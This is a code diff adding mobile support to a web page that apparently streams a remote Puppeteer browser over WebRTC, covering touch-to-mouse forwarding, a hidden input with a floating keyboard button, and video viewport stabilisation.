@@ -3,9 +3,15 @@
   <head>
     <title>PAGE_TITLE</title>
     <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, interactive-widget=overlays-content" />
   </head>
   <body>
     <video id="remote_video" playsinline disablepictureinpicture autoplay muted style="width: 100vw; height: auto;"></video>
+    <!-- Mobile: hidden input for virtual keyboard (focused only via FAB, never on tap) -->
+    <input id="mobile-kb" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
+      style="position:fixed;left:0;top:0;width:1px;height:1px;opacity:0.01;border:none;outline:none;font-size:16px;line-height:16px;padding:0;margin:0;pointer-events:none;z-index:-1;">
+    <!-- Mobile: floating keyboard button, shown only in mobile_mode -->
+    <button id="mobile-kb-fab" style="display:none;position:fixed;bottom:24px;right:24px;width:52px;height:52px;border-radius:50%;background:rgba(0,0,0,0.55);border:2px solid rgba(255,255,255,0.25);color:white;font-size:22px;z-index:9999;cursor:pointer;-webkit-tap-highlight-color:transparent;touch-action:manipulation;">&#9000;</button>
     <style>
 html, body {margin: 0; height: 100%; overflow: hidden}
     </style>
@@ -31,7 +37,12 @@ function height(){
 const client_ip = 'CLIENT_IP';
 const target_id = 'TARGET_ID';
 const debug_multi_user_ip = 'DEBUG_MULTI_USER_IP';
+const mobile_mode = MOBILE_MODE;
 let session_id = null;
+
+if (mobile_mode && window.top === window && navigator.virtualKeyboard) {
+  navigator.virtualKeyboard.overlaysContent = true
+}
 
 // Leer debugIp de la URL para usar en multi-user testing
 const urlParams = new URLSearchParams(window.location.search);
@@ -75,6 +86,42 @@ const flushPendingIceCandidates = function(){
   }
 }
 const video = document.querySelector("#remote_video")
+
+function lockVideoDimensions(w, h) {
+  if (!mobile_mode || w <= 0 || h <= 0) {
+    return
+  }
+  if (h < viewport_height * 0.6) {
+    console.log('[PINPO] ignoring transient small video size: ' + w + 'x' + h)
+    return
+  }
+
+  stableVideoW = w
+  stableVideoH = h
+  video.style.width = stableVideoW + 'px'
+  video.style.height = stableVideoH + 'px'
+  video.style.minWidth = stableVideoW + 'px'
+  video.style.minHeight = stableVideoH + 'px'
+  video.style.objectFit = 'fill'
+  video.style.display = 'block'
+  video.style.position = 'fixed'
+  video.style.left = '0'
+  video.style.top = '0'
+  video.style.transform = 'none'
+  video.style.transformOrigin = 'top left'
+}
+
+function stabilizeMobileViewport() {
+  if (!mobile_mode || viewport_width <= 0 || viewport_height <= 0) {
+    return
+  }
+  lockVideoDimensions(viewport_width, viewport_height)
+  document.documentElement.style.width = viewport_width + 'px'
+  document.documentElement.style.height = viewport_height + 'px'
+  document.body.style.width = viewport_width + 'px'
+  document.body.style.height = viewport_height + 'px'
+  window.scrollTo(0, 0)
+}
 //connect to the server over websockets and anounce we are a new fescar
 const tokenParam = new URLSearchParams(window.location.search).get('token') || ''
 const socket = io.connect(window.location.origin, {
@@ -84,11 +131,66 @@ const socket = io.connect(window.location.origin, {
 })
 let viewport_width = width()
 let viewport_height = height()
+// If browser-front passed explicit dimensions via URL params (vw/vh), use those.
+// They are measured in script.js right before the iframe loads, so they accurately
+// reflect the available content area and avoid the browser-chrome height mismatch.
+const _vpParams = new URLSearchParams(window.location.search)
+const _vpw = parseInt(_vpParams.get('vw'))
+const _vph = parseInt(_vpParams.get('vh'))
+if (_vpw > 0) viewport_width = _vpw
+if (_vph > 0) viewport_height = _vph
+// Actual Puppeteer viewport — updated by server via 'fescar_viewport'.
+let puppeteerViewportWidth = viewport_width
+let puppeteerViewportHeight = viewport_height
+// Stable video rect snapshotted before keyboard appears (keyboard shrinks the live rect)
+let stableVideoW = 0
+let stableVideoH = 0
+let fescarRegistered = false
+let lastSentVideoW = 0
+let lastSentVideoH = 0
+
+function emitVideoDimensionsIfLarger() {
+  var w = Math.round(stableVideoW)
+  var h = Math.round(stableVideoH)
+  if (w <= 0 || h <= 0 || (w <= lastSentVideoW && h <= lastSentVideoH)) {
+    return
+  }
+
+  lastSentVideoW = Math.max(lastSentVideoW, w)
+  lastSentVideoH = Math.max(lastSentVideoH, h)
+  console.log('[PINPO] video_dimensions: ' + lastSentVideoW + 'x' + lastSentVideoH)
+  socket.emit('video_dimensions', { width: lastSentVideoW, height: lastSentVideoH })
+}
+
+function measureVideoUntilStable(deadlineMs) {
+  var deadline = Date.now() + deadlineMs
+  var measuredW = 0
+  var measuredH = 0
+  function sample() {
+    var r = video.getBoundingClientRect()
+    if (r.width > 0 && r.height > 0) {
+      measuredW = Math.max(measuredW, Math.round(r.width))
+      measuredH = Math.max(measuredH, Math.round(r.height))
+    }
+    if (Date.now() < deadline) {
+      requestAnimationFrame(sample)
+      return
+    }
+    if (measuredW > 0 && measuredH > 0) {
+      lockVideoDimensions(measuredW, measuredH)
+    }
+    emitVideoDimensionsIfLarger()
+  }
+  requestAnimationFrame(sample)
+}
 
 socket.on('connect', async function(){
   session_id = await generateSessionId(debug_client_ip);
-  console.log(`[PINPO] Session ID: ${session_id} (IP: ${client_ip}, debugIp: ${debugIpFromUrl})`);
-  socket.emit('new_fescar', viewport_width, viewport_height, debug_client_ip, target_id, session_id)
+  console.log(`[PINPO] Session ID: ${session_id} (IP: ${client_ip}, debugIp: ${debugIpFromUrl}, mobile: ${mobile_mode})`);
+  if (!fescarRegistered) {
+    fescarRegistered = true
+    socket.emit('new_fescar', viewport_width, viewport_height, debug_client_ip, target_id, session_id, mobile_mode)
+  }
 })
 
 socket.on("push_state", function(new_state){
@@ -135,6 +237,17 @@ socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
   //add video track when it becomes available
   peerConnection.ontrack = function(event){
     video.srcObject = event.streams[0]
+    // In mobile mode, browser-front passes the fixed iframe content size as vw/vh.
+    // Use that single source of truth instead of re-negotiating from transient rects.
+    video.addEventListener('loadedmetadata', function onMeta() {
+      video.removeEventListener('loadedmetadata', onMeta)
+      if (mobile_mode) {
+        lockVideoDimensions(viewport_width, viewport_height)
+        emitVideoDimensionsIfLarger()
+      } else {
+        measureVideoUntilStable(1000)
+      }
+    })
   }
   //3) send ICE candidates as they become available
   peerConnection.onicecandidate = function(event){
@@ -153,6 +266,35 @@ socket.on("candidate", function(broadcaster_socket_id, candidate){
   peerConnection
     .addIceCandidate(rtcCandidate)
     .catch(e => console.error(e))
+})
+
+// Server tells us the actual Puppeteer viewport size for coordinate scaling
+socket.on('fescar_viewport', function(info) {
+  puppeteerViewportWidth = info.width
+  puppeteerViewportHeight = info.height
+})
+
+// Server detected an input was focused in Puppeteer — show virtual keyboard
+socket.on('show_keyboard', function() {
+  if (mobile_mode) {
+    const mobileKb = document.getElementById('mobile-kb')
+    if (mobileKb) {
+      mobileKb.focus({ preventScroll: true })
+      stabilizeMobileViewport()
+      mobileKb.selectionStart = mobileKb.selectionEnd = mobileKb.value.length
+    }
+  }
+})
+
+socket.on('hide_keyboard', function() {
+  if (mobile_mode) {
+    const mobileKb = document.getElementById('mobile-kb')
+    if (mobileKb) {
+      mobileKb.blur()
+      mobileKb.value = 'a'
+    }
+    stabilizeMobileViewport()
+  }
 })
 
 socket.on("execute_script", function(script){
@@ -285,6 +427,169 @@ copy_to_clipboard_legacy = function(data){
   dummy.select()
   document.execCommand("copy")
   document.body.removeChild(dummy)
+}
+
+// ── Mobile: touch → mouse forwarding + keyboard FAB ────────────────────────
+// Touch events do not generate reliable mouse events on all mobile browsers.
+// We intercept touch on the video element, forward as mouse events, and
+// prevent the browser from synthesising its own (avoids double-firing).
+// Keyboard: a floating FAB button (⌨) focuses a hidden input — this way the
+// virtual keyboard only appears when explicitly requested, not on every tap.
+if (mobile_mode) {
+  const fab = document.getElementById('mobile-kb-fab')
+  const mobileKb = document.getElementById('mobile-kb')
+  const SENTINEL = 'a'
+  fab.style.display = 'flex'
+  fab.style.alignItems = 'center'
+  fab.style.justifyContent = 'center'
+  mobileKb.value = SENTINEL
+
+
+
+  // ── Touch → mouse on the video ────────────────────────────────────────────
+  function touchToMouse(e) {
+    // Only handle single-touch (ignore pinch/zoom)
+    if (e.touches && e.touches.length > 1) return
+    const t = e.changedTouches[0]
+    if (!t) return
+    // Scale from video display pixels → Puppeteer CSS pixels.
+    // Use the stable reference size snapshotted before the keyboard appeared;
+    // the live getBoundingClientRect().height shrinks when the virtual keyboard
+    // reduces the visual viewport, which would introduce a Y-axis offset.
+    var rect = video.getBoundingClientRect()
+    var refW = stableVideoW > 0 ? stableVideoW : rect.width
+    var refH = stableVideoH > 0 ? stableVideoH : rect.height
+    var scaleX = puppeteerViewportWidth / (refW || 1)
+    var scaleY = puppeteerViewportHeight / (refH || 1)
+    var vv = window.visualViewport
+    var viewportOffsetX = vv ? vv.offsetLeft : 0
+    var viewportOffsetY = vv ? vv.offsetTop : 0
+    var normalizedX = t.clientX + viewportOffsetX
+    var normalizedY = t.clientY + viewportOffsetY
+    var px = (normalizedX - rect.left) * scaleX
+    var py = (normalizedY - rect.top) * scaleY
+    if (e.type === 'touchend') {
+      console.log('[TOUCH] raw=(' + Math.round(t.clientX) + ',' + Math.round(t.clientY) + ')'
+        + ' norm=(' + Math.round(normalizedX) + ',' + Math.round(normalizedY) + ')'
+        + ' vv=[x=' + Math.round(viewportOffsetX) + ' y=' + Math.round(viewportOffsetY)
+        + ' w=' + Math.round(vv ? vv.width : 0) + ' h=' + Math.round(vv ? vv.height : 0) + ']'
+        + ' rect=[l=' + Math.round(rect.left) + ' t=' + Math.round(rect.top)
+        + ' w=' + Math.round(rect.width) + ' h=' + Math.round(rect.height) + ']'
+        + ' ref=' + Math.round(refW) + 'x' + Math.round(refH)
+        + ' puppeteer=' + puppeteerViewportWidth + 'x' + puppeteerViewportHeight
+        + ' scale=(' + scaleX.toFixed(3) + ',' + scaleY.toFixed(3) + ')'
+        + ' => puppeteer=(' + Math.round(px) + ',' + Math.round(py) + ')')
+    }
+    var type = e.type === 'touchstart' ? 'mousedown'
+             : e.type === 'touchend'   ? 'mouseup'
+             : 'mousemove'
+    socket.emit('mouse_event', { type: type, clientX: px, clientY: py, movementX: 0, movementY: 0 })
+    if (e.type === 'touchend') {
+      socket.emit('mouse_event', { type: 'click', clientX: px, clientY: py, movementX: 0, movementY: 0 })
+    }
+    // Prevent synthetic mouse events from the browser (avoids double-firing)
+    e.preventDefault()
+  }
+  video.addEventListener('touchstart', touchToMouse, { passive: false })
+  video.addEventListener('touchmove',  touchToMouse, { passive: false })
+  video.addEventListener('touchend',   touchToMouse, { passive: false })
+
+  // ── FAB: open keyboard ────────────────────────────────────────────────────
+  fab.addEventListener('touchend', function(e) {
+    e.stopPropagation()
+    e.preventDefault()
+    mobileKb.focus({ preventScroll: true })
+    stabilizeMobileViewport()
+    mobileKb.selectionStart = mobileKb.selectionEnd = mobileKb.value.length
+  })
+
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener('resize', stabilizeMobileViewport)
+    window.visualViewport.addEventListener('scroll', stabilizeMobileViewport)
+  }
+
+  // ── Hidden input: forward typed text / backspace / enter ─────────────────
+  var _lastInputMs = 0
+  var _lastInputPayload = ''
+  var _lastInputPayloadMs = 0
+  var _handledBeforeInputUntil = 0
+  var _lastBeforeInputPayload = ''
+  var _lastBeforeInputMs = 0
+
+  function emitMobileTextPayload(payload, now) {
+    if (!payload) return
+    if (payload === _lastBeforeInputPayload && now - _lastBeforeInputMs < 120) return
+    socket.emit('paste', payload)
+    _lastBeforeInputPayload = payload
+    _lastBeforeInputMs = now
+    _lastInputPayload = payload
+    _lastInputPayloadMs = now
+  }
+
+  mobileKb.addEventListener('beforeinput', function(e) {
+    var now = Date.now()
+    e.stopPropagation()
+    stabilizeMobileViewport()
+    if (e.inputType === 'insertText' || e.inputType === 'insertCompositionText' || e.inputType === 'insertFromPaste') {
+      emitMobileTextPayload(e.data || '', now)
+      _handledBeforeInputUntil = now + 250
+      e.preventDefault()
+      mobileKb.value = SENTINEL
+      mobileKb.selectionStart = mobileKb.selectionEnd = SENTINEL.length
+      return
+    }
+    if (e.inputType === 'deleteContentBackward') {
+      socket.emit('keydown', 'Backspace')
+      socket.emit('keyup', 'Backspace')
+      _handledBeforeInputUntil = now + 250
+      _lastBeforeInputPayload = ''
+      _lastInputPayload = ''
+      e.preventDefault()
+      mobileKb.value = SENTINEL
+      mobileKb.selectionStart = mobileKb.selectionEnd = SENTINEL.length
+    }
+  })
+
+  mobileKb.addEventListener('input', function() {
+    stabilizeMobileViewport()
+    if (Date.now() < _handledBeforeInputUntil) {
+      mobileKb.value = SENTINEL
+      mobileKb.selectionStart = mobileKb.selectionEnd = SENTINEL.length
+      return
+    }
+    // Debounce: some mobile keyboards fire 'input' twice per keystroke
+    var now = Date.now()
+    if (now - _lastInputMs < 30) return
+    _lastInputMs = now
+    var v = mobileKb.value
+    if (v.length > SENTINEL.length) {
+      var payload = v.slice(SENTINEL.length)
+      if (!(payload === _lastInputPayload && now - _lastInputPayloadMs < 500)) {
+        emitMobileTextPayload(payload, now)
+      }
+    } else if (v.length < SENTINEL.length) {
+      socket.emit('keydown', 'Backspace')
+      socket.emit('keyup', 'Backspace')
+      _lastInputPayload = ''
+      _lastInputPayloadMs = now
+    }
+    mobileKb.value = SENTINEL
+    mobileKb.selectionStart = mobileKb.selectionEnd = SENTINEL.length
+  })
+  mobileKb.addEventListener('keydown', function(e) {
+    // Stop bubbling to the document-level keyDown handler, which would
+    // forward "Unidentified" (mobile soft-keyboard key) to Puppeteer and fail
+    e.stopPropagation()
+    if (e.key === 'Enter') {
+      socket.emit('keydown', 'Enter')
+      socket.emit('keyup', 'Enter')
+      e.preventDefault()
+    }
+  })
+  mobileKb.addEventListener('keyup', function(e) {
+    e.stopPropagation()
+    stabilizeMobileViewport()
+  })
 }
 
     </script>
